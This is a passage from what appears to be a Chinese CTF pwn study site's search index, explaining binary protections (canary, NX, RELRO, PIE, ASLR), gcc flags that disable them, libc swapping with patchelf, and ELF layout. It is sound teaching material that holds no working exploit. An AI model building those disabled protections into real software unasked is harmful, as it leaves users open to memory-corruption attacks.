\u7ade\u8d5b\u9886\u57df\u3001\u57f9\u517b\u5174\u8da3\u7684\u6700\u4f73\u5165\u53e3\u3002Misc \u8003\u5bdf\u57fa\u672c\u77e5\u8bc6\uff0c\u5bf9\u5b89\u5168\u6280\u80fd\u7684\u5404\u4e2a\u5c42\u9762\u90fd\u6709\u4e0d\u540c\u7a0b\u5ea6\u7684\u6d89\u53ca\uff0c\u53ef\u4ee5\u5728\u5f88\u5927\u7a0b\u5ea6\u4e0a\u542f\u53d1\u601d\u7ef4\u3002</p>"},{"location":"pwn/introduction/","title":"Pwn\u7b80\u4ecb","text":"<p>\u6982\u8ff0 pwn \u7684\u4e00\u4e9b\u65b9\u5411\uff0c\u4ee5\u53ca\u601d\u60f3\u3002</p>"},{"location":"pwn/introduction/#glibc-pwn","title":"GLIBC Pwn","text":"<p>\u901a\u5e38\u662f\u4e0e linux \u4e0b\u7684\u5185\u5b58\u7ba1\u7406\u6709\u5173\u3002\u5982\u6211\u4eec\u5e38\u8bf4\u7684 house of \u7cfb\u5217\u5185\u5bb9</p>"},{"location":"pwn/introduction/#browser-pwn","title":"Browser Pwn","text":"<p>\u4e0e\u6d4f\u89c8\u5668\u76f8\u5173\u7684Pwn</p> <p>https://github.com/Escapingbug/awesome-browser-exploit</p>"},{"location":"pwn/introduction/#kernel-pwn","title":"Kernel Pwn","text":""},{"location":"pwn/introduction/#windows-kernel","title":"Windows Kernel","text":""},{"location":"pwn/introduction/#linux-kernel","title":"Linux Kernel","text":"<p>Linux kernel \u7684\u6f0f\u6d1e\uff0c\u5c31 CTF \u800c\u8a00\uff0c\u591a\u662f LKM \u7684\u6f0f\u6d1e\uff0c\u901a\u8fc7\u8fd9\u4e9b\u6f0f\u6d1e\u8fbe\u5230\u63d0\u6743\u4ee5\u53ca\u83b7\u53d6\u7a33\u5b9a shell \u7b49\u76ee\u7684\u3002</p>"},{"location":"pwn/introduction/#todo","title":"TODO","text":"<ul> <li>Need a new document section for english.</li> <li>Look into reccursivly translating into english through google.</li> <li>Get a public work to clean up grammar. </li> </ul>"},{"location":"pwn/roadmap/","title":"Pwn\u5b66\u4e60\u8def\u5f84","text":""},{"location":"pwn/points/binary-protection/binary-protection/","title":"checksec\u4e0e\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u4fdd\u62a4\u673a\u5236\uff08\u542bPIE\u548cASLR\u6bd4\u8f83\uff09","text":""},{"location":"pwn/points/binary-protection/binary-protection/#_1","title":"\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u5404\u4fdd\u62a4\u673a\u5236","text":"<pre><code>checksec bin \n[*] '/usr/ctf/pwn/tests/bin'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n</code></pre>"},{"location":"pwn/points/binary-protection/binary-protection/#canary","title":"CANARY","text":"<p>\u6808\u6ea2\u51fa\u4fdd\u62a4\u662f\u4e00\u79cd\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u7f13\u89e3\u624b\u6bb5\uff0c\u5f53\u51fd\u6570\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u6f0f\u6d1e\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8986\u76d6\u6808\u4e0a\u7684\u8fd4\u56de\u5730\u5740\u6765\u8ba9shellcode\u80fd\u591f\u5f97\u5230\u6267\u884c\u3002\u5f53\u542f\u7528\u6808\u4fdd\u62a4\u540e\uff0c\u51fd\u6570\u5f00\u59cb\u6267\u884c\u7684\u65f6\u5019\u4f1a\u5148\u5f80\u6808\u91cc\u63d2\u5165cookie\u4fe1\u606f\uff0c\u5f53\u51fd\u6570\u771f\u6b63\u8fd4\u56de\u7684\u65f6\u5019\u4f1a\u9a8c\u8bc1cookie\u4fe1\u606f\u662f\u5426\u5408\u6cd5\uff0c\u5982\u679c\u4e0d\u5408\u6cd5\u5c31\u505c\u6b62\u7a0b\u5e8f\u8fd0\u884c\u3002\u653b\u51fb\u8005\u5728\u8986\u76d6\u8fd4\u56de\u5730\u5740\u7684\u65f6\u5019\u5f80\u5f80\u4e5f\u4f1a\u5c06cookie\u4fe1\u606f\u7ed9\u8986\u76d6\u6389\uff0c\u5bfc\u81f4\u6808\u4fdd\u62a4\u68c0\u67e5\u5931\u8d25\u800c\u963b\u6b62shellcode\u7684\u6267\u884c\u3002\u5728Linux\u4e2d\u6211\u4eec\u5c06cookie\u4fe1\u606f\u79f0\u4e3acanary\u3002</p> <p>\u7f16\u8bd1\u65f6\u53ef\u4ee5\u63a7\u5236\u6808\u4fdd\u62a4\u7a0b\u5ea6</p> <pre><code>gcc -fno-stack-protector -o test test.c  //\u7981\u7528\u6808\u4fdd\u62a4\ngcc -fstack-protector -o test test.c   //\u542f\u7528\u5806\u6808\u4fdd\u62a4\uff0c\u4e0d\u8fc7\u53ea\u4e3a\u5c40\u90e8\u53d8\u91cf\u4e2d\u542b\u6709 char \u6570\u7ec4\u7684\u51fd\u6570\u63d2\u5165\u4fdd\u62a4\u4ee3\u7801\ngcc -fstack-protector-all -o test test.c //\u542f\u7528\u5806\u6808\u4fdd\u62a4\uff0c\u4e3a\u6240\u6709\u51fd\u6570\u63d2\u5165\u4fdd\u62a4\u4ee3\u7801\n</code></pre>"},{"location":"pwn/points/binary-protection/binary-protection/#nx","title":"NX","text":"<p>NX\u5373No-eXecute\uff08\u4e0d\u53ef\u6267\u884c\uff09\u7684\u610f\u601d\uff0cNX\u7684\u57fa\u672c\u539f\u7406\u662f\u5c06\u6570\u636e\u6240\u5728\u5185\u5b58\u9875\u6807\u8bc6\u4e3a\u4e0d\u53ef\u6267\u884c\uff0c\u5f53\u7a0b\u5e8f\u6ea2\u51fa\u6210\u529f\u8f6c\u5165shellcode\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u5c1d\u8bd5\u5728\u6570\u636e\u9875\u9762\u4e0a\u6267\u884c\u6307\u4ee4\uff0c\u6b64\u65f6CPU\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u800c\u4e0d\u662f\u53bb\u6267\u884c\u6076\u610f\u6307\u4ee4\u3002</p> <p>\u603b\u7684\u8bf4\u5c31\u662f\u5f00\u4e86\u6808\u4e0a\u5c31\u4e0d\u53ef\u6267\u884c\u4ee3\u7801\uff0c\u6ca1\u5f00\u5c31\u53ef\u4ee5</p> <p>gcc\u7f16\u8bd1\u5668\u9ed8\u8ba4\u5f00\u542fNX\uff0c\u5173\u95ed\u9009\u9879\uff1a</p> <pre><code>gcc test.c -z execstack -o test </code></pre>"},{"location":"pwn/points/binary-protection/binary-protection/#relro","title":"RELRO","text":"<p>\u8bbe\u7f6e\u7b26\u53f7\u91cd\u5b9a\u5411\u8868\u683c\u4e3a\u53ea\u8bfb\u6216\u5728\u7a0b\u5e8f\u542f\u52a8\u65f6\u5c31\u89e3\u6790\u5e76\u7ed1\u5b9a\u6240\u6709\u52a8\u6001\u7b26\u53f7\uff0c\u4ece\u800c\u51cf\u5c11\u5bf9GOT\uff08Global Offset Table\uff09\u653b\u51fb\u3002RELRO\u4e3a\u201d Partial RELRO\u201d\uff0c\u8bf4\u660e\u6211\u4eec\u5bf9GOT\u8868\u5177\u6709\u5199\u6743\u9650\u3002</p> <p>Partial RELRO \u53ef\u4ee5\u5199GOT\u8868\uff1bFULL RELRO\u5199\u4e0d\u4e86</p>"},{"location":"pwn/points/binary-protection/binary-protection/#pie","title":"PIE","text":"<p>PIE\uff08Position Independent Executables\uff09\u662f\u7f16\u8bd1\u5668\uff08gcc\uff0c..\uff09\u529f\u80fd\u9009\u9879\uff08-fPIE\uff09\uff0c\u4f5c\u7528\u4e8eexcutable\u7f16\u8bd1\u8fc7\u7a0b\uff0c\u53ef\u5c06\u5176\u7406\u89e3\u4e3a\u7279\u6b8a\u7684PIC\uff08so\u4e13\u7528\uff0cPosition Independent Code\uff09\uff0c\u52a0\u4e86PIE\u9009\u9879\u7f16\u8bd1\u51fa\u6765\u7684ELF\u7528file\u547d\u4ee4\u67e5\u770b\u4f1a\u663e\u793a\u5176\u4e3aso\uff0c\u5176\u968f\u673a\u5316\u4e86ELF\u88c5\u8f7d\u5185\u5b58\u7684\u57fa\u5740\uff08\u4ee3\u7801\u6bb5\u3001plt\u3001got\u3001data\u7b49\u5171\u540c\u7684\u57fa\u5740\uff09</p>"},{"location":"pwn/points/binary-protection/binary-protection/#aslr","title":"ASLR","text":"<p>\u9996\u5148ASLR\u662f\u5f52\u5c5e\u4e8e\u7cfb\u7edf\u529f\u80fd\u7684\uff0c \u662f\u4e00\u79cd\u9488\u5bf9\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u5b89\u5168\u4fdd\u62a4\u6280\u672f\uff0c\u901a\u8fc7\u5bf9\u5806\u3001\u6808\u3001\u5171\u4eab\u5e93\u6620\u5c04\u7b49\u7ebf\u6027\u533a\u5e03\u5c40\u7684\u968f\u673a\u5316\uff0c\u901a\u8fc7\u589e\u52a0\u653b\u51fb\u8005\u9884\u6d4b\u76ee\u7684\u5730\u5740\u7684\u96be\u5ea6\uff0c\u9632\u6b62\u653b\u51fb\u8005\u76f4\u63a5\u5b9a\u4f4d\u653b\u51fb\u4ee3\u7801\u4f4d\u7f6e\uff0c\u8fbe\u5230\u963b\u6b62\u6ea2\u51fa\u653b\u51fb\u7684\u76ee\u7684\u7684\u4e00\u79cd\u6280\u672f\u3002</p> <p>\u6709\u4e09\u79cd\u6a21\u5f0f  \u5b58\u50a8\u4e8e <code>/proc/sys/kernel/randomize_va_space</code></p> <pre><code>0 - \u8868\u793a\u5173\u95ed\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\u3002\n1 - \u8868\u793a\u5c06mmap\u7684\u57fa\u5740\uff0cstack\u548cvdso\u9875\u9762\u968f\u673a\u5316\u3002\n2 - \u8868\u793a\u57281\u7684\u57fa\u7840\u4e0a\u589e\u52a0\u6808\uff08heap\uff09\u7684\u968f\u673a\u5316\u3002\n</code></pre> <p>PWN\u7684\u8bdd\u9898\u76ee\u73af\u5883\u4e00\u822c\u90fd\u662f\u5f00 2</p>"},{"location":"pwn/points/binary-protection/binary-protection/#pieaslr","title":"PIE\u548cASLR\u5f02\u540c","text":"<p>\u5355\u770b\u6bd4\u8f83\u751f\u786c\uff0c\u770b\u4e0b\u9762\u7684vmmap\u6bd4\u8f83\u4f1a\u66f4\u6e05\u6670\uff0c\u5efa\u8bae\u8bfb\u8005\u6267\u884c\u7a0b\u5e8f\u5bf9\u6bd4\u5206\u6790</p> <ul> <li>PIE\u662f\u7f16\u8bd1\u5668\u529f\u80fd\u9009\u9879\uff0c\u4f5c\u7528\u4e8eexcutable\u7f16\u8bd1\u8fc7\u7a0b\uff0c\u968f\u673a\u5316\u4e86ELF\u88c5\u8f7d\u5185\u5b58\u7684\u57fa\u5740\uff08\u4ee3\u7801\u6bb5\u3001plt\u3001got\u3001data\u7b49\u5171\u540c\u7684\u57fa\u5740\uff09</li> <li>ASLR\u7684\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u529f\u80fd\u9009\u9879\uff0c\u4f5c\u7528\u4e8eexecutable\uff08ELF\uff09\u88c5\u5165\u5185\u5b58\u8fd0\u884c\u65f6\uff0c\u53ea\u80fd\u968f\u673a\u5316stack\u3001heap\u3001libraries\uff08.so\uff09\u7684\u57fa\u5740\uff0c\u4e0d\u8d1f\u8d23\u4ee3\u7801\u6bb5\u3001plt\u3001got\u3001data\u57fa\u5730\u5740\u7684\u968f\u673a\u5316</li> <li>ASLR\u65e9\u4e8ePIE\u51fa\u73b0</li> <li>CTF\u4e2dPWN\u9898\u57fa\u672c\u90fd\u4f1a\u5f00ASLR=2</li> </ul> <p>gcc\u7f16\u8bd1\u9ed8\u8ba4\u5f00\u542fPIE\uff0c\u5173\u95ed\u9009\u9879\uff1a</p> <pre><code>gcc test.c -o bin_pie\ngcc test.c -no-pie -o bin_no_pie\n</code></pre> <p>gef \u8c03\u8bd5\u65f6\u9ed8\u8ba4\u5173\u95edASLR\uff0c\u542f\u52a8\u65b9\u5f0f\uff1a</p> <pre><code>gef\u27a4  aslr on\n[+] Enabling ASLR\ngef\u27a4  start # \u6ce8\u610faslr\u5f00\u542f\u4e00\u5b9a\u8981\u5728start\u4e4b\u524d\n</code></pre>"},{"location":"pwn/points/binary-protection/binary-protection/#pie-off-aslr-off","title":"pie off, aslr off","text":"<p>\u6bcf\u6b21\u6267\u884c\u540e \u6240\u6709\u5730\u5740\u533a\u95f4\u90fd\u662f\u56fa\u5b9a\u7684</p> <p></p>"},{"location":"pwn/points/binary-protection/binary-protection/#pie-off-aslr-on","title":"pie off, aslr on","text":"<ul> <li>\u53ef\u4ee5\u770b\u5230\u7ea2\u8272\u90e8\u5206\u4ee3\u7801\u7a0b\u5e8f\u6bb5\u4e0eASLR\u5173\u95ed\u65f6\u76f8\u540c\uff0c\u8bf4\u660eASLR\u4e0d\u8d1f\u8d23\u8fd9\u90e8\u5206\u5730\u5740\u968f\u673a\u5316</li> <li>\u84dd\u8272\u90e8\u5206\u6bcf\u6b21\u6267\u884c\u90fd\u662f\u968f\u673a\u7684\uff0c\u5373 \u5806\u3001\u6808\u3001libc\u6bb5\u7b49</li> </ul>"},{"location":"pwn/points/binary-protection/binary-protection/#pie-on-aslr-off","title":"pie on, aslr off","text":"<ul> <li>\u4e0e <code>pie off, aslr off</code> \u7684\u5dee\u522b\u4ec5\u5728\u4e8e\u7ea2\u8272\u90e8\u5206\u4ee3\u7801\u7a0b\u5e8f\u6bb5\uff0c\u76f8\u5f53\u4e8e\u90fd\u52a0\u4e86\u4e00\u4e2a\u504f\u79fb\u91cf</li> <li>\u4f46\u662f\u6bcf\u6b21\u6267\u884c\u540e  \u6240\u6709\u5730\u5740\u533a\u95f4\u4e5f\u90fd\u662f\u56fa\u5b9a\u7684</li> </ul>"},{"location":"pwn/points/binary-protection/binary-protection/#pie-on-aslr-on","title":"pie on, aslr on","text":"<p>\u8fd9\u65f6\u5019\u76f8\u5f53\u4e8e\u6240\u6709\u5730\u5740\u533a\u57df\u6bcf\u6b21\u6267\u884c\u540e  \u84dd\u8272\u533a\u57df\u90fd\u662f\u968f\u673a\u7684</p> <p></p>"},{"location":"pwn/points/binary-protection/binary-protection/#_2","title":"\u603b\u7ed3","text":"<ol> <li>PIE\u76f8\u5f53\u4e8e\u80fd\u529b\u8d4b\u4e88\uff0c\u800cASLR\u624d\u662f\u771f\u6b63\u4f7f\u7528</li> <li>\u5728CTF\u4e2d\uff0cPIE\u4e3b\u8981\u5f71\u54cd\u7a0b\u5e8f\uff08\u4e0d\u5305\u542blibc\uff09\u7684\u5730\u5740\uff0c\u5f71\u54cd\u8df3\u8f6c\u76ee\u6807\u6267\u884c\u5730\u5740\u7684\u786e\u5b9a\uff1bASLR\u4e3b\u8981\u5f71\u54cd libc, stack \u548c heap \u7684\u5730\u5740\u786e\u5b9a</li> <li>\u6ce8\u610f\u5373\u4fbf\u5730\u5740\u662f\u968f\u673a\u7684\uff0c\u4f46\u540c\u4e00\u5730\u5740\u533a\u57df\u5185\u7684\u5185\u5bb9\u7684\u504f\u79fb\u91cf\u90fd\u662f\u56fa\u5b9a\u7684</li> <li>PIE\u5f00\u542f\u540e\uff0cIDA\u4e2d\u770b\u5230\u7684\u4ee3\u7801\u5730\u5740\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528\uff0c\u8981\u52a0\u4e0a\u4e00\u4e2abase\uff08\u901a\u5e38\u9700\u6cc4\u9732\uff09</li> </ol>"},{"location":"pwn/points/binary-protection/binary-protection/#_3","title":"\u5176\u4ed6","text":"<p>\u5f00\u4e86PIE\u548cASLR\u65f6\u6bcf\u6b21\u5730\u5740\u90fd\u4f1a\u53d8\uff0c\u90a3\u4e48\u5982\u4f55\u4e0b\u65ad\u70b9\u5462\uff1f</p> <p>\u5982\u679c\u6709\u7b26\u53f7\u8868\u7684\u8bdd\u5f53\u7136\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 <code>b func_name</code> \uff0c\u4f46\u5982\u679c\u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u5728gef\u4e2d\u53ef\u4ee5\u4f7f\u7528 <code>pie b offset</code> \uff0cgef\u4f1a\u81ea\u52a8\u5e2e\u6211\u4eec\u8ba1\u7b97\u51fa\u6b63\u786e\u7684\u5730\u5740\uff0c\u5982\u4e0b\u56fe</p> <p></p>"},{"location":"pwn/points/change-libc/change-libc/","title":"\u4f7f\u7528\u6307\u5b9a\u7248\u672clibc\u6267\u884c/\u8c03\u8bd5\u4e8c\u8fdb\u5236\u6587\u4ef6\u65b9\u6cd5","text":"<p>\u521a\u5f00\u59cb\u5b66\u4e60pwn\u7684\u65f6\u5019\u5927\u90e8\u5206\u4eba\u90fd\u4f1a\u9047\u89c1\u7531\u4e8elibc\u7248\u672c\u4e0e\u7a0b\u5e8f\u8981\u6c42\u4e0d\u5339\u914d\u800c\u5bfc\u81f4\u7684\u65e0\u6cd5\u8c03\u8bd5\u6216\u8fd0\u884c\u7684\u5927\u5751\u3002\u8fd9\u662f\u56e0\u4e3a\u5927\u90e8\u5206\u7a0b\u5e8f\u662f\u52a8\u6001\u94fe\u63a5\u751f\u6210\u7684\uff0c\u5728\u9996\u6b21\u6267\u884c\u5230\u67d0\u4e9b\u7cfb\u7edf\u51fd\u6570\u7684\u65f6\u5019\u4f1a\u5148\u5728libc.so (shared object) \u5f53\u4e2d\u627e\u5230\u5bf9\u5e94\u51fd\u6570\u5e76\u6267\u884c\uff0c\u6240\u4ee5\u8fde\u63a5\u5230\u9519\u8bef\u7248\u672c\u7684glibc\uff0c\u4f1a\u51fa\u73b0\u653b\u51fb\u811a\u672c\u5931\u8d25\uff0c\u8c03\u8bd5\u8fc7\u7a0b\u51fa\u9519\u7b49\u60c5\u51b5\u3002\u67e5\u770b\u7a0b\u5e8f\u5f53\u524d\u4f7f\u7528\u7684libc\u7248\u672c\u7684\u547d\u4ee4\uff1a<code>ldd ./bin</code></p> <p>\u89e3\u51b3\u65b9\u6cd5\u5982\u4e0b\uff1a</p>","tags":["CTF","pwn"]},{"location":"pwn/points/change-libc/change-libc/#0x1-glibc-all-in-one","title":"0x1 glibc-all-in-one\u4e0b\u8f7d\u5b89\u88c5","text":"<p><pre><code>git clone https://github.com/matrix1001/glibc-all-in-one.git\ncd glibc-all-in-one/\n\npython3 update_list\n</code></pre> \u53ef\u4ee5\u770b\u5230\u6709list, old_list; download, download_old \u6587\u4ef6</p>","tags":["CTF","pwn"]},{"location":"pwn/points/change-libc/change-libc/#0x2-glibc","title":"0x2 \u67e5\u770b\u6240\u6709glibc\u7248\u672c","text":"<pre><code>cat list\n(\u8f93\u51fa:\n2.23-0ubuntu11.3_amd64\n2.23-0ubuntu11.3_i386\n2.23-0ubuntu3_amd64\n2.23-0ubuntu3_i386\n2.27-3ubuntu1.5_amd64\n2.27-3ubuntu1.5_i386\n...\n\ncat old_list\n(\u8f93\u51fa:\n2.21-0ubuntu4.3_amd64\n2.21-0ubuntu4.3_i386\n2.21-0ubuntu4_amd64\n2.21-0ubuntu4_i386\n2.24-3ubuntu1_amd64\n2.24-3ubuntu1_i386\n...\n</code></pre>","tags":["CTF","pwn"]},{"location":"pwn/points/change-libc/change-libc/#0x3-glibc32-_i386-64-_amd64","title":"0x3 \u4e0b\u8f7d\u6240\u9700\u7248\u672cglibc(32\u4f4d\u7a0b\u5e8f\u7528 *_i386 64\u4f4d\u7528 *_amd64)","text":"<p>\u6587\u4ef6\u4e2ddownload\u5bf9\u5e94\u4e0b\u8f7dlist\u4e2d\u7684glibc,  download_old\u5bf9\u5e94\u4e0b\u8f7dold_list\u4e2d\u7684glibc \u4e0b\u8f7d\u540e\u7684glibc\u5728<code>./libs</code>\u76ee\u5f55\u4e2d <pre><code>./download 2.23-0ubuntu3_amd64\n./download_old 2.24-3ubuntu1_i386\n</code></pre></p>","tags":["CTF","pwn"]},{"location":"pwn/points/change-libc/change-libc/#0x4-patchelf","title":"0x4 patchelf \u4e0b\u8f7d\u5b89\u88c5","text":"<pre><code>git clone https://github.com/NixOS/patchelf.git\ncd patchelf\n\nsudo apt-get install autoconf automake libtool\n./boostrap.sh\n\n./configure\nmake &amp;&amp; make install\n</code></pre>","tags":["CTF","pwn"]},{"location":"pwn/points/change-libc/change-libc/#0x5-libclibc-binelf","title":"0x5 \u66f4\u6362\u76ee\u6807\u7a0b\u5e8flibc\u4e3a\u6307\u5b9alibc (./bin\u4e3a\u4f60\u60f3\u8fd0\u884c\u7684elf\u6587\u4ef6)","text":"<pre><code>patchelf --set-interpreter glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-linux-x86-64.so.2 ./bin\n\nlibpath=$(patchelf --print-needed ./bin)    #\u83b7\u53d6\u5f53\u524d\u8fde\u63a5\u7684libc\u8def\u5f84\u540d\u79f0\npatchelf --replace-needed \"$libpath\" glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so ./bin  #\u66f4\u6362   \u7b2c\u4e00\u4e2a\u53c2\u6570\u662flibc*.so\u7684\u76ee\u5f55, \u6bcf\u4e2a\u7248\u672c\u540d\u79f0\u4e0d\u4e00\u6837\uff0c\u4ed4\u7ec6\u67e5\u770b\n</code></pre>","tags":["CTF","pwn"]},{"location":"pwn/points/change-libc/change-libc/#0x6-patchelf-version-glibc_234-not-found","title":"0x6 \u53ef\u80fd\u95ee\u9898\uff1a patchelf\u62a5\u9519 <code>version GLIBC_2.34\u2019 not found</code>","text":"<p>\u89e3\u51b3\u65b9\u6cd5\uff08\u7a0d\u4e3a\u7e41\u7410\uff09\uff1a\u5728ubuntu18\u6216ubuntu16\u4e2d\u7528gcc (gcc\u7248\u672c\u4e3a7-) \u7f16\u8bd1\uff0c\u518d\u5c06\u6587\u4ef6\u5bfc\u5165\u5f53\u524d\u7cfb\u7edf\u5e76\u8fdb\u884c\u4ee5\u4e0apatchelf\u64cd\u4f5c\uff0c\u5c31\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\u4e86 \u5177\u4f53\u539f\u56e0\u7b14\u8005\u8fd8\u6ca1\u627e\u5230\uff0c\u53ef\u80fd\u662f\u56e0\u4e3a\u4f60\u5f53\u524dlinux\u7cfb\u7edf\u7248\u672c\u8f83\u9ad8\uff0c\u5bf9\u5e94\u7684gcc\u7248\u672c\u9ad8\uff0c\u7f16\u8bd1\u540e\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u65e0\u6cd5\u4e0e\u8fc7\u65e9\u7684glibc\u7248\u672c\u8fde\u63a5\uff0c\u4f46\u6211\u5c1d\u8bd5\u8fc7\u5728kali 6.0.0 (gcc\u7248\u672c\u4e3a12.2.0) \u4e2d\u4e0b\u8f7d\u4f4e\u7248\u672cgcc\u8fdb\u884c\u7f16\u8bd1\u4ee5\u53ca\u591a\u79cd\u65b9\u5f0f\uff0c\u8fd8\u662f\u540c\u6837\u7684\u62a5\u9519\u7ed3\u679c\uff08\u5982\u679c\u6709\u5927\u795e\u53d1\u73b0\u5177\u4f53\u539f\u56e0\u548c\u66f4\u7b80\u4fbf\u7684\u89e3\u51b3\u65b9\u6cd5\u80fd\u544a\u8bc9\u6211\u5417\uff0c\u611f\u6fc0\uff09</p>","tags":["CTF","pwn"]},{"location":"pwn/points/elf-file/elf-file/","title":"ELF\u6587\u4ef6","text":"","tags":["CTF","pwn"]},{"location":"pwn/points/elf-file/elf-file/#_1","title":"\u4ece\u6e90\u7801\u5230\u53ef\u6267\u884c\u6587\u4ef6","text":"<p>\u9884\u5904\u7406 -&gt;  \u7f16\u8bd1 -&gt;  \u6c47\u7f16 -&gt;  \u94fe\u63a5</p> <pre><code>gcc -E filename.c &gt; filename.i   ; preprocessed source\ngcc -S filename.i &gt; filename.s   ; assembly code\ngcc -c filename.s &gt; filename.o   ; object file\ngcc    filename.o &gt; filename.out ; binary executable\n</code></pre> <p></p>","tags":["CTF","pwn"]},{"location":"pwn/points/elf-file/elf-file/#_2","title":"\u94fe\u63a5","text":"","tags":["CTF","pwn"]},{"location":"pwn/points/elf-file/elf-file/#_3","title":"\u9759\u6001\u94fe\u63a5 \uff08\u7f16\u8bd1\u540e\u5b8c\u6210\uff09","text":"<p>\u53ef\u79fb\u690d\u6027\u5f3a\uff0c\u6587\u4ef6\u5927</p> <pre><code>gcc file.c -static -o bin\n</code></pre> <p></p> <pre><code>gef\u27a4  vmmap \n[ Legend:  Code | Heap | Stack ]\nStart              End                Offset             Perm Path\n0x00000000400000 0x00000000401000 0x00000000000000 r-- /usr/ctf/pwn/tests/bin_static\n0x00000000401000 0x00000000479000 0x00000000001000 r-x /usr/ctf/pwn/tests/bin_static\n0x00000000479000 0x000000004a0000 0x00000000079000 r-- /usr/ctf/pwn/tests/bin_static\n0x000000004a0000 0x000000004a4000 0x000000000a0000 r-- /usr/ctf/pwn/tests/bin_static\n0x000000004a4000 0x000000004a7000 0x000000000a4000 rw- /usr/ctf/pwn/tests/bin_static\n0x000000004a7000 0x000000004ce000 0x00000000000000 rw- [heap]\n0x007ffff7ff9000 0x007ffff7ffd000 0x00000000000000 r-- [vvar]\n0x007ffff7ffd000 0x007ffff7fff000 0x00000000000000 r-x [vdso]\n0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]\n</code></pre>","tags":["CTF","pwn"]},{"location":"pwn/points/elf-file/elf-file/#_4","title":"\u52a8\u6001\u94fe\u63a5 \uff08\u7a0b\u5e8f\u52a0\u8f7d\u540e\u5b8c\u6210\uff09","text":"<p>\u53ef\u79fb\u690d\u6027\u5dee\uff0c\u6587\u4ef6\u5c0f</p> <p></p> <pre><code>gef\u27a4  vmmap \n[ Legend:  Code | Heap | Stack ]\nStart              End                Offset             Perm Path\n0x00555555554000 0x00555555555000 0x00000000000000 r-- /usr/ctf/pwn/tests/a.out\n0x00555555555000 0x00555555556000 0x00000000001000 r-x /usr/ctf/pwn/tests/a.out\n0x00555555556000 0x00555555557000 0x00000000002000 r-- /usr/ctf/pwn/tests/a.out\n0x00555555557000 0x00555555558000 0x00000000002000 r-- /usr/ctf/pwn/tests/a.out\n0x00555555558000 0x00555555559000 0x00000000003000 rw- /usr/ctf/pwn/tests/a.out\n0x007ffff7dc3000 0x007ffff7dc6000 0x00000000000000 rw- \n0x007ffff7dc6000 0x007ffff7dec000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6\n0x007ffff7dec000 0x007ffff7f41000 0x00000000026000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6\n0x007ffff7f41000 0x007ffff7f94000 0x0000000017b000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6\n0x007ffff7f94000 0x007ffff7f98000 0x000000001ce000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6\n0x007ffff7f98000 0x007ffff7f9a000 0x000000001d2000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6\n0x007ffff7f9a000 0x007ffff7fa7000 0x00000000000000 rw- \n0x007ffff7fc3000 0x007ffff7fc5000 0x00000000000000 rw- \n0x007ffff7fc5000 0x007ffff7fc9000 0x00000000000000 r-- [vvar]\n0x007ffff7fc9000 0x007ffff7fcb000 0x00000000000000 r-x [vdso]\n0x007ffff7fcb000 0x007ffff7fcc000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n0x007ffff7fcc000 0x007ffff7ff1000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n0x007ffff7ff1000 0x007ffff7ffb000 0x00000000026000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n0x007ffff7ffb000 0x007ffff7ffd000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n0x007ffff7ffd000 0x007ffff7fff000 0x00000000032000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]\n</code></pre>","tags":["CTF","pwn"]},{"location":"pwn/points/elf-file/elf-file/#_5","title":"\u91cd\u8981\u8282\u4fe1\u606f","text":"Section \u8bf4\u660e \u6743\u9650 .init \u521d\u59cb\u5316\u4ee3\u7801\uff0c\u5148\u4e8emain\u6267\u884c R_X .fini \u7ed3\u675f\u4ee3\u7801\uff0c\u5728\u6700\u540e\u6267\u884c R_X .text \u7a0b\u5e8f\u6c47\u7f16\u6307\u4ee4 R_X .rodata \u5b58\u653e\u53ea\u8bfb\u6570\u636e\uff0c\u4e00\u822c\u662f\u5b57\u7b26\u4e32\u5e38\u91cf\uff08\u4ee3\u7801\u4e2d\u76f4\u63a5\u4f7f\u7528\u7684\u5b57\u7b26\u4e32\u4e5f\u7b97\uff09 R__ .data \u4fdd\u5b58\u5df2\u7ecf\u521d\u59cb\u5316\uff08\u975e\u96f6\u521d\u59cb\u5316\uff09\u7684\u5168\u5c40\u53d8\u91cf\u548c\u9759\u6001\u5c40\u90e8\u53d8\u91cf RW_ .bss \u672a\u521d\u59cb\u5316\uff08\u96f6\u521d\u59cb\u5316\uff09\u7684\u5168\u5c40\u53d8\u91cf\u548c\u9759\u6001\u5c40\u90e8\u53d8\u91cf\u4fdd\u5b58\u5728bss\u6bb5 RW_ .got Global Offset Table  \u5b58\u653e\u5916\u90e8\u7b26\u53f7\u7684\u5b9e\u9645\u504f\u79fb RW_ .got.plt \u548c.plt\u5171\u540c\u53d1\u6325\u4f5c\u7528\uff0c\u5b58\u653e.plt\u6240\u9700\u7684\u504f\u79fb\u91cf RW_ | R__ (full-RELRO) .plt Procedure Linkage Table\u7a0b\u5e8f\u94fe\u63a5\u8868   